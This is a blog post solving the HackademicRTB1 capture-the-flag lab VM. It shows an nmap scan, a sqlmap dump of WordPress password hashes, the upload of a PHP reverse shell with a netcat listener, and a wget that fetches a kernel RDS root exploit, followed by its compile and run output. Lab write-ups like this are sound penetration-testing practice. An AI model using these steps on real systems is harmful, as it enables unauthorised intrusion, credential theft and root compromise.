---
title: HackademicRTB1 challenge solution
categories:
- CTF
---
Happy New Year to all my readers!

There are many things on my personal roadmap for 2012! How about you ?

If you want to get certified in the penetration testing field (like me :-) ) you have to practice a lot since most of the best courses & exams like eCPPT and OSCP/E are practical exams! Therefor I am currently working on some hack-mes, one of them, which I've recently solved, is "HackademicRTB1" provided by ghostinthelab.

You can download the vulnerable VMware-Workstation image here: [http://ghostinthelab.wordpress.com/](http://ghostinthelab.wordpress.com/2011/09/06/hackademic-rtb1-root-this-box/ "ghostinthelab.wordpress.com")

The goal is to read the key.txt file placed in the root directory. **If you want to solve this Hackme by yourself, stop reading here!**

#### My solution:

Before doing anything else do a little nmap action to find out if there are any other ports open (and therefor exploitable) beside the HTTPd one:

{% highlight bash %}
Nmap scan report for 192.168.0.24
Host is up (0.00062s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
| http-methods: GET HEAD POST OPTIONS TRACE
| Potentially risky methods: TRACE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
|_http-title: Hackademic.RTB1
MAC Address: 00:0C:29:54:8A:F0 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:kernel:2.6
OS details: Linux 2.6.22 - 2.6.36
Uptime guess: 0.050 days (since Sun Jan  1 22:19:26 2012)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=197 (Good luck!)
IP ID Sequence Generation: All zeros
{% endhighlight %}

Port 80 is worldwide open running an Apache 2.2.15, since there is no public exploit available for this version and there is no other port open, you have to get in using a common web-attack. Have a look at the website itself:

![]({{ site.baseurl }}/assets/HackademicRTB1_1.png "HackademicRTB1_1")

There are two possible links, and et voila the "Uncategorized" is vulnerable to a classic SQL Injection:

![]({{ site.baseurl }}/assets/HackademicRTB1_2.png "HackademicRTB1_2")

Oh, this error message reveals that the site is running a Wordpress - wp_categories is a typical Wordpress - table. Let's complete the SQLi by hand or using sqlmap and dump the userdatabase "wp_users" of wordpress:

{% highlight bash %}
./sqlmap.py --url http://192.168.0.24/Hackademic_RTB1/?cat=1 -D "wordpress" -T "wp_users" -C "user_login,user_pass" --dump

Database: wordpress
Table: wp_users
[6 entries]
+--------------+---------------------------------------------+
| user_login   | user_pass                                   |
+--------------+---------------------------------------------+
| NickJames    | 21232f297a57a5a743894a0e4a801fc3 (admin)    |
| MaxBucky     | 50484c19f1afdaf3841a0d821ed393d2 (kernel)   |
| GeorgeMiller | 7cbb3252ba6b7e9c422fac5334d22054 (q1w2e3)   |
| JasonKonnors | 8601f6e1028a8e8a966f6c33fcd9aec4 (maxwell)  |
| TonyBlack    | a6e514f9486b83cb53d8d932f9a04292 (napoleon) |
| JohnSmith    | b986448f0bb9e5e124ca91d3d650f52c            |
+--------------+---------------------------------------------+
{% endhighlight %}

Sqlmap automatically brute-forces the passwords. After some trial & error you'll find out that the user "GeorgeMiller" is an administrative user. Since wordpress has got a fileupload function, this will be my key to access an interactive shell. Login to the Wordpress wp-admin - backend with username "GeorgeMiller" and password "q1w2e3" and activate the upload-functionality (and do not forget to add the ".php" extension to the "allowed file extensions" list, so we can upload a shellscript):

![]({{ site.baseurl }}/assets/HackademicRTB1_3.png "HackademicRTB1_3")
There is a simple PHP reverse shell script delivered with Backtrack, which I will upload via wordpress for later usage. You can also use other shellscripts like C99 or R57, but this is a bit oversized for now:

![]({{ site.baseurl }}/assets/HackademicRTB1_4.png "HackademicRTB1_4")
That's been quite simple until here. Now you just need to launch a netcat-session which will listening to the port defined in the "phpreverseshell_01.php" script:

{% highlight bash %}nc -l -p 1337{% endhighlight %}

and execute the reverse-shell script using your favourite browser, and et voila there's the shell:

{% highlight bash %}
Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
 20:26:36 up 42 min,  0 users,  load average: 0.00, 0.08, 0.04
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=489(apache) groups=489(apache)
sh: no job control in this shell
sh-4.0$
{% endhighlight %}

As you can see here the shell is run by the user "apache" which runs the httpd too. That's basically ok, but we're not allowed to list files within the /root/ directory:

{% highlight bash %}
sh-4.0$ ls -l /root/
ls -l /root/
ls: cannot open directory /root/: Permission denied
{% endhighlight %}

So we need to get root-privileges somehow...Let's check the kernel version...

{% highlight bash %}
sh-4.0$ uname -a
uname -a
Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
{% endhighlight %}

...and now let's have a look if there is a usable privilege escalation exploit for this version. After doing some googling:

> Linux Kernel <= 2.6.36-rc8 RDS privilege escalation exploit
> 
> The rds_page_copy_user function in net/rds/page.c in the Reliable Datagram Sockets (RDS)  
> protocol implementation in the Linux kernel before 2.6.36 does not properly validate  
> addresses obtained from user space, which allows local users to gain privileges  
> via crafted use of the sendmsg and recvmsg system calls.

Looks usable :-)! Let's download the exploit source to the target machine and compile it using gcc:

{% highlight bash %}
sh-4.0$ wget http://www.vsecurity.com/download/tools/linux-rds-exploit.c
wget http://www.vsecurity.com/download/tools/linux-rds-exploit.c
2012-01-01 19:34:42 (58.3 KB/s) - `linux-rds-exploit.c' saved [6435/6435]

sh-4.0$ gcc linux-rds-exploit.c -o linuxrds
gcc linux-rds-exploit.c -o linuxrds
{% endhighlight %}

Launch it:

{% highlight bash %}
sh-4.0$ ./linuxrds
./linuxrds
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved rds_proto_ops to 0xe0a21b20
 [+] Resolved rds_ioctl to 0xe0a0c06a
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[*] Overwriting function pointer...
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved rds_proto_ops to 0xe0a21b20
 [+] Resolved rds_ioctl to 0xe0a0c06a
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
{% endhighlight %}

and finally, we've got our root shell and are able to read the contents of the key.txt within the /root/ directory:

{% highlight bash %}
id
uid=0(root) gid=0(root)
ls -l /root
total 16
drwxr-xr-x 2 root root 4096 Jan 7 2011 Desktop
-rw------- 1 root root 1101 Jan 7 2011 anaconda-ks.cfg
-rw-r--r-- 1 root root 223 Jan 8 2011 key.txt
-rw-r--r-- 1 root root 221 Jan 7 2011 key.txt~

cat /root/key.txt
Yeah!!
You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) 

$_d&jgQ>>ak\#b"(Hx"o<la_\%

Regards,
mr.pr0n || p0wnbox.Team || 2011
http://p0wnbox.com
{% endhighlight %}

There might be different ways to solve this Hackme. Feel free to comment them here.
